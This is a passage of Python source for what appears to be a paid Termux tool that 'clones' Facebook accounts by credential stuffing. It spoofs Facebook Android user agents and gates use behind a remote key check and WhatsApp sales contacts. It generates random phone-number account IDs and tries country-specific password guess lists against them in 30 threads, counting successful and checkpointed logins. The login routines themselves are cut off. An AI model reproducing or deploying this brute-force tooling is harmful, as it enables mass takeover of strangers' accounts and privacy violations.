        'com.facebook.katana|FB4A', 'com.facebook.orca|Orca-Android', 
        'com.facebook.mlite|MessengerLite'])
    FBAN = fb.split('|')[1]
    platform = fb.split('|')[0]
    ua = (f'Dalvik/2.1.0 (Linux; U; Android {Anderson}; {model} Build/LRX22C) '
          f'[FBAN/{FBAN};FBAV/{cho}.0.0.15.89;FBPN/{platform};FBLC/sv_SE;FBBV/{vir};'
          f'FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/{model};FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;'
          f'FBDM{{density={str(random.choice(range(1, 4)))}.0,width={str(random.choice(range(720, 1500)))}'
          f',height={str(random.choice(range(1500, 2000)))};FB_FW/1;]')
    return ua

def ug1():
    fb_v1 = str(random.choice(range(111, 555)))
    fb_v2 = str(random.choice(range(111, 555)))
    rdp1 = str(random.choice(range(111111111, 333333333)))
    rdp2 = str(random.choice(range(111111111, 333333333)))
    andv = str(random.choice(range(8, 12)))
    ua = (f'Dalvik/2.1.0 (Linux; U; Android {andv}.0.0; moto e5 plus Build/OPPS27.91-179-8-16) '
          f'[FBAN/FB4A;FBAV/{fb_v1}.0.0.50.{fb_v2};FBPN/com.facebook.katana;FBLC/es_MX;FBBV/{rdp1};'
          f'FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/{andv}.0.0;FBCA/armeabi-v7a:armeabi;'
          f'FBDM{{density=1.7,width=720,height=1358}};FB_FW/1;FBRV/0;]')
    return ua

def ug2():
    fb_v1 = str(random.choice(range(111, 555)))
    fb_v2 = str(random.choice(range(111, 555)))
    rdp1 = str(random.choice(range(111111111, 433333333)))
    rdp2 = str(random.choice(range(111111111, 433333333)))
    andv = str(random.choice(range(8, 12)))
    ua = (f'Dalvik/2.1.0 (Linux; U; Android {andv}.1.1; vivo V3Max Build/LMY47V) '
          f'[FBAN/Orca-Android;FBAV/{fb_v1}.0.0.16.{fb_v2};FBPN/com.facebook.orca;FBLC/en_US;FBBV/{rdp1};'
          f'FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/{andv}.1.1;FBCA/armeabi-v7a:armeabi;'
          f'FBDM{{density=3.0,width=1080,height=1920}}')
    return ua
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ ETC ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_US'
try:
    fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
    fbcr = 'Roshan'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                    fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                    sim_id+=fbcr
                except Exception as e:
                    fbcr = "Roshan"
                    sim_id+=fbcr
        else:
                fbcr = 'Roahan'
                sim_id+=fbcr
except:
        fbcr = "Roahan"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ APPROVAL SYSTEM ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
uid = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = "".join(uid).replace("_","").replace("360","AHS").replace("u","9").replace("a","A") 
plat = platform.version()[14:][:21][::-1].upper()
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = "MRERROR-"
bumper = bxd+id+xp
url1 = "https://gauravdehelten.blogspot.com/2025/08/error.html"
url2 = "https://ethankleinpogi.blogspot.com/2025/08/errorapproval.html"
myweb2 = requests.get(url1).text + "\n" + requests.get(url2).text
def approval():
    clear()
    try:
        if bumper in myweb2:
           print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m YOUR KEY IS SUCCESSFULLY APPROVED')
           time.sleep(3)
        else:
           print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m ERROR TOOLS IS PREMIUM')
           print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m YOUR SUBSCRIPTION DATE EXPIRED')
           print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m ONLY CLONING DATE : \x1b[1;92m{date}')
           print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m TOOL IS PAID TOOLS NOT FREE USER INBOX ME')
           print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m ONLY FOR PAID USER CONTACT TO ADMIN')
           print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m ONLY ACTIVE ID CLONE 99%')
           print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m CONTACT DEVELOPER TO GET SUBSCRIPTION')
           linex()
           print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m FILE CRACK')
           print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m RANDOM MIX ID CRACK')
           print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m GMAIL ID CRACK')
           print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m OLD ID CRACK')
           print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m GAME CRACK')
           print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m ACTIVE ID CRACK')
           linex()
           print(f' \x1b[1;91m[\x1b[1;92m1\x1b[1;91m] \x1b[1;97m WHATSAPP  ADMIN : GAURAV')
           print(f' \x1b[1;91m[\x1b[1;92m2\x1b[1;91m] \x1b[1;97m WHATSAPP  ADMIN : ETHAN')
           linex()
           choice=input(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m CHOOSE : ')
           if choice in ['1','01']:
              tsk = "HELLO GAURAV SIR! I NEED TO BUY YOUR PREMIUM TOOLS SO PLEASE APPROVE MY KEY-:)\n\nName: "+___username___+" \nKey: "+bumper
              os.system(f'termux-open-url "https://wa.me/+919634167763?text={tsk}"')
              approval()
           if choice in ['2','02']:
              tsk = "HELLO ETHAN SIR! I NEED TO BUY YOUR PREMIUM TOOLS SO PLEASE APPROVE MY KEY-:)\n\nName: "+___username___+" \nKey: "+bumper
              os.system(f'termux-open-url "https://wa.me/+639610075203?text={tsk}"')
              approval()
    except requests.exceptions.ConnectionError:
        print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m NO INTERNET CONNECTION...')
        exit()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LOGO ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
logo = f"""\x1b[1;92m
  d88888b d8888b. d8888b.  .d88b.  d8888b
  88'     88  `8D 88  `8D .8P  Y8. 88  `8D
  88ooooo 88oobY' 88oobY' 88    88 88oobY'
  88~~~~~ 88`8b   88`8b   88    88 88`8b
  88.     88 `88. 88 `88. `8b  d8' 88 `88
  Y88888P 88   YD 88   YD  `Y88P'  88   YD \x1b[1;92mE\x1b[1;93mT\x1b[1;94mH\x1b[1;95mA\x1b[1;96mN
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
         💚 MIND IT NOTHING IS IMPOSSIBLE 💚
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m AUTHOR   : ERROR x GAURAV x THARKI
 \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m FACEBOOK : ETHAN KLEIN HUILEN
 \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m GITHUB   : ERRORDEATH-403
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m FEATURE  : FILExRANDOMxGMAILxOLD
 \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m SYSTEM   : DATA/WIFI
 \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m VERSION  : 0.5
 \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m STATUS   : \x1b[1;91m[\x1b[1;92mPAID\x1b[1;91m]
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m USERNAME : {___username___}
 \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m KEY      : {bumper}
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ COLOR ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'
P = '\x1b[1;97m'
M = '\033[1;33m'
H = '\033[1;32m'
K = '\x1b[1;97m'
B = '\x1b[1;96m'
U = '\x1b[1;95m'
O = '\x1b[1;97m'
R = '\x1b[38;5;246m'
N = '\x1b[0m'
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LOOP ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
uid=[]
tokenku=[]
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ MENU ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def menu():
            clear()
            print(' \x1b[1;91m[\x1b[1;92m1\x1b[1;91m] \x1b[1;97m FILE CLONING\n \x1b[1;91m[\x1b[1;92m2\x1b[1;91m] \x1b[1;97m RANDOM CLONING\n \x1b[1;91m[\x1b[1;92m3\x1b[1;91m] \x1b[1;97m GMAIL CLONING \n \x1b[1;91m[\x1b[1;92m4\x1b[1;91m] \x1b[1;97m OLD CLONING\n \x1b[1;91m[\x1b[1;92m5\x1b[1;91m] \x1b[1;97m AUTO CREATE\n \x1b[1;91m[\x1b[1;92m6\x1b[1;91m] \x1b[1;97m JOIN WHATSAPP GROUP\n \x1b[1;91m[\x1b[1;92m0\x1b[1;91m] \x1b[1;97m EXIT')
            linex()
            xd=input(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m CHOOSE : ')
            if xd in ['1','01']:
                clear()
                print(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m EXAMPLE : /sdcard/ERROR.txt etc..')
                linex()
                file = input(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m PUT FILE PATH : \033[1;32m')
                try:
                    fo = open(file,'r').read().splitlines()
                except FileNotFoundError:
                    print(' \x1b[1;91m[\x1b[1;92m!\x1b[1;91m] \x1b[1;91m FILE LOCATION NOT FOUND ')
                    time.sleep(1)
                    menu()
                clear()
                print(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m ALL METHOD WORKING ')
                linex()
                print(' \x1b[1;91m[\x1b[1;92m1\x1b[1;91m] \x1b[1;97m METHOD ')
                print(' \x1b[1;91m[\x1b[1;92m2\x1b[1;91m] \x1b[1;97m METHOD ')
                print(' \x1b[1;91m[\x1b[1;92m3\x1b[1;91m] \x1b[1;97m METHOD ')
                print(' \x1b[1;91m[\x1b[1;92m4\x1b[1;91m] \x1b[1;97m METHOD ')
                print(' \x1b[1;91m[\x1b[1;92m5\x1b[1;91m] \x1b[1;97m METHOD ')
                print(' \x1b[1;91m[\x1b[1;92m6\x1b[1;91m] \x1b[1;97m METHOD ')
                print(' \x1b[1;91m[\x1b[1;92m7\x1b[1;91m] \x1b[1;97m METHOD ')
                print(' \x1b[1;91m[\x1b[1;92m8\x1b[1;91m] \x1b[1;97m METHOD ')
                linex()
                mthd=input(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m CHOOSE : ')
                plist = []
                clear()
                print(' \x1b[1;91m[\x1b[1;92m1\x1b[1;91m] \x1b[1;97m AUTO PASSWORD ')
                print(' \x1b[1;91m[\x1b[1;92m2\x1b[1;91m] \x1b[1;97m CHOICE PASSWORD ')
                linex()
                passlist=input(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m CHOOSE : ')
                if passlist in ['1','01']:
                   clear()
                   print(' \x1b[1;91m[\x1b[1;92m1\x1b[1;91m] \x1b[1;97m AUTO BANGLADESH PASSLIST ')
                   print(' \x1b[1;91m[\x1b[1;92m2\x1b[1;91m] \x1b[1;97m AUTO PAKISTAN PASSLIST ')
                   print(' \x1b[1;91m[\x1b[1;92m3\x1b[1;91m] \x1b[1;97m AUTO NEPAL PASSLIST ')
                   print(' \x1b[1;91m[\x1b[1;92m4\x1b[1;91m] \x1b[1;97m AUTO INDIAN PASSLIST ')
                   print(' \x1b[1;91m[\x1b[1;92m5\x1b[1;91m] \x1b[1;97m AUTO PHILIPPINES PASSLIST ')
                   linex()
                   countrypasslist=input(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m CHOOSE : ')
                   if countrypasslist in ['1','01']:
                       plist.append('first last')
                       plist.append('firstlast')
                       plist.append('first123')
                       plist.append('first12345')
                       plist.append('first1234')     
                       plist.append('firstlast123')
                       plist.append('firstlast1234')
                       plist.append('firstlast@123')
                       plist.append("last123")
                       plist.append("Last12345")
                       plist.append('first123456')
                       plist.append('first@123')
                       plist.append('First@123')
                       plist.append('first321')
                       plist.append('First@12')
                       plist.append('first@1234')
                       plist.append('First123')
                       plist.append('@first123')
                       plist.append('@first1234')
                       plist.append('first@@@')
                   elif countrypasslist in ['2','02']:
                       plist.append('First Last')
                       plist.append('first last')
                       plist.append('firstlast')
                       plist.append('first12')
                       plist.append('first123')
                       plist.append('first1234')
                       plist.append('first12345')
                       plist.append('first123456')
                       plist.append('firstlast12')
                       plist.append('firstlast123')
                       plist.append('firstlast786')
                       plist.append('firstlast1234')
                       plist.append('firstlast1122')
                       plist.append('first@123')
                       plist.append('first1122')
                       plist.append('first786')
                       plist.append('first111')
                       plist.append('firstlast111')
                       plist.append('last786')
                       plist.append('first khan')
                       plist.append('first@786')
                       plist.append('786786')
                   elif countrypasslist in ['3','03']:
                       plist.append('first last')
                       plist.append('First Last')
                       plist.append('first123')
                       plist.append('First123')
                       plist.append('first1234')
                       plist.append('First1234')
                       plist.append('firstlast')
                       plist.append('First12345')
                       plist.append('First1234')
                       plist.append('first1234')
                       plist.append('nepal123')
                       plist.append('nepal12345')
                       plist.append('firstfirst')
                       plist.append('First@123')
                       plist.append('first@123')
                       plist.append('first@1234')
                       plist.append('last123')
                       plist.append('first@last')
                       plist.append('first@12345')
                       plist.append('firstlast12345')
                       plist.append('Nepal@123')
                       plist.append('kathmandu')
                       plist.append('i love you')
                   elif countrypasslist in ['4','04']:
                       plist.append('57575751')
                       plist.append('first last')
                       plist.append('57273200')
                       plist.append('59039200')
                       plist.append('07860786')
                       plist.append('firstlast')
                       plist.append('md first')
                       plist.append('mdfirst')
                       plist.append('first12')
                       plist.append('first 25')
                       plist.append('firstlast123')
                       plist.append('first 123')
                       plist.append('first@12345')
                       plist.append('first123')
                       plist.append('first@123')
                       plist.append('@first123')
                       plist.append('first12')
                       plist.append('first123456')
                       plist.append('first 12345')
                       plist.append('first@12')
                       plist.append('firstlast@123')
                       plist.append('first 1234')
                       plist.append('first123456789')
                       plist.append('first last')
                       plist.append('57273200')
                       plist.append('59039200')
                       plist.append('07860786')
                       plist.append('firstlast')
                       plist.append('md first')
                       plist.append('mdfirst')
                       plist.append('first12')
                       plist.append('first 25')
                       plist.append('firstlast123')
                       plist.append('first 123')
                       plist.append('first@12345')
                       plist.append('first123')
                       plist.append('first@123')
                       plist.append('@first123')
                       plist.append('first12')
                       plist.append('first123456')
                       plist.append('first 12345')
                       plist.append('first@12')
                       plist.append('firstlast@123')
                       plist.append('first 12345')
                       plist.append('first 1234')
                       plist.append('first123456789')
                   elif countrypasslist in ['5','05']:
                       plist.append('first last')
                       plist.append('last first')
                       plist.append('firstlast')
                       plist.append('lastfirst')
                       plist.append('firstfirst')
                       plist.append('lastlast')
                       plist.append('firstlast123')
                       plist.append('firstlast12345')
                       plist.append('firstlast123456')
                       plist.append('firstlast123456789')
                       plist.append('firstlast143')
                       plist.append('lastfirst123')
                       plist.append('lastfirst12345')
                       plist.append('lastfirst123456')
                       plist.append('lastfirst123456789')
                       plist.append('lastfirst143')
                       plist.append('first123')
                       plist.append('first12345')
                       plist.append('first123456')
                       plist.append('first123456789')
                       plist.append('first143')
                       plist.append('last123')
                       plist.append('last12345')
                       plist.append('last123456')
                       plist.append('last123456789')
                       plist.append('last143')
                       plist.append('firstpogi')
                       plist.append('firstganda')
                else:
                   try:
                      ps_limit = int(input(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m HOW MANY PASSWORDS DO YOU WANT TO ADD ? : '))
                   except:
                      ps_limit =1
                   clear()
                   print(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m EXAMPLE : first last,firstlast,first123')
                   linex()
                   for i in range(ps_limit):
                       plist.append(input(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m PASSWORD NO.{i+1}: '))
                clear()
                print(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97mDO YOU WENT SHOW CP ACCOUNT? (y/n): ')
                linex()
                cx=input(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m CHOOSE : ')
                if cx in ['y','Y','yes','Yes','1']:
                    pcp.append('y')
                else:
                    pcp.append('n')
                with tred(max_workers=30) as crack_submit:
                    clear()
                    total_ids = str(len(fo))
                    print(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m TOTAL ACCOUNT IDS : \033[1;32m'+total_ids+f' ')
                    print(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m USE FLIGHT MODE FOR SPEED UP ')
                    linex()
                    for user in fo:
                        ids,names = user.split('|')
                        passlist = plist
                        if mthd in ['1','01']:
                             crack_submit.submit(api1,ids,names,passlist)
                        elif mthd in ['2','02']:
                             crack_submit.submit(api2,ids,names,passlist)
                        elif mthd in ['3','03']:
                             crack_submit.submit(api3,ids,names,passlist)
                        elif mthd in ['4','04']:
                             crack_submit.submit(api4,ids,names,passlist)
                        elif mthd in ['5','05']:
                             crack_submit.submit(api5,ids,names,passlist)
                        elif mthd in ['6','06']:
                             crack_submit.submit(api6,ids,names,passlist)
                        elif mthd in ['7','07']:
                             crack_submit.submit(api7,ids,names,passlist)
                        elif mthd in ['8','08']:
                             crack_submit.submit(api8,ids,names,passlist)
                print('\033[1;37m')
                linex()
                print(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m THE PROCESS HAS COMPLETED')
                linex()
                print(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m PRESS ENTER TO BACK ')
                menu()
            elif xd in ['2','02']:
                pak()
            elif xd in ['3','03']:
                gmail()
                exit()
            elif xd in ['4','04']:
                cracker = old_clone()
                cracker.old_menu()
            elif xd in ['5','05']:
                autocreate()
            elif xd in ['6','06']:
                os.system('xdg-open https://chat.whatsapp.com/BJpN0899hdRAuRtTa6wCBl?mode=ems_wa_t')
                menu()
            elif xd in ['0','00']:
                exit(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m THANKS FOR USE🥰 ')
            else:
                print(' \x1b[1;91m[\x1b[1;92m!\x1b[1;91m] \x1b[1;91m OPTION NOT FOUND IN MENU...')
                time.sleep(2)
                menu()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ RANDOM CLONING ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def pak():
    user=[]
    clear()
    print(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m PUT YOUR OWN COUNTRY CODE')
    code = input(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m PUT CODE : ')
    clear()
    try:
        limit = int(input(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m PUT LIMIT : '))
    except ValueError:
        limit = 5000
    clear()
    print(' \x1b[1;91m[\x1b[1;92m1\x1b[1;91m] \x1b[1;97m METHOD ')
    linex()
    mthd = input(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m CHOOSE : ')
    clear()
    print(' \x1b[1;91m[\x1b[1;92m1\x1b[1;91m] \x1b[1;97m PAKISTAN CLONING\n \x1b[1;91m[\x1b[1;92m2\x1b[1;91m] \x1b[1;97m AFGHANISTAN CLONING\n \x1b[1;91m[\x1b[1;92m3\x1b[1;91m] \x1b[1;97m BANGLADESH CLONING\n \x1b[1;91m[\x1b[1;92m4\x1b[1;91m] \x1b[1;97m INDIA CLONING\n \x1b[1;91m[\x1b[1;92m5\x1b[1;91m] \x1b[1;97m NEPAL CLONING\n \x1b[1;91m[\x1b[1;92m6\x1b[1;91m] \x1b[1;97m PHILIPPINES CLONING ')
    linex()
    pcs = input(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m CHOOSE : ')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with tred(max_workers=30) as ERROR:	
        clear()
        tl = str(len(user))
        print(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m TOTAL ACCOUNT ID : \033[1;32m'+tl+f' ')
        print(' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m USE FLIGHT MODE FOR SPEED UP ')
        linex()
        for psx in user:
            ids = code+psx
            if pcs in ['1','01']:
               passlist = [psx,ids,'khankhan','khan1122','janjan','khanbaba','pakistan','khan12345','khankhan12345','pak123','pak12345','pakistan','khan123','baloch','kingkhan']
            if pcs in ['2','02']:
               passlist = [psx,ids,'200300','afghanistan','۱۲۳۴۵۶۷۸۹','khan12345','khan123','500500','۱۲۳۴۵۶']
            elif pcs in ['3','03']:
               passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire','57575751','57273200','i love you','iloveyou','59039200','708090']
            elif pcs in ['4','04']:
               passlist = [psx,ids,'57575751','57273200','i love you','iloveyou','59039200','708090']
            elif pcs in ['5','05']:
               passlist = [ids,psx,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
            elif pcs in ['6','06']:
               passlist = [psx,ids,'magandaako','gandako','pogiako','pogiako123','gwapoako123','gwapoako','iloveyou','i love you','cuteko','cuteko123','cuteko143','mahal123','mahal143','iloveyou143','maganda123','maganda143','pogi123','pogi143']
            if mthd in ['1','01']:
               ERROR.submit(ERROR1,ids,passlist)
            if mthd in ['2','02']:
               ERROR.submit(ERROR2,ids,passlist)
            if mthd in ['3','03']:
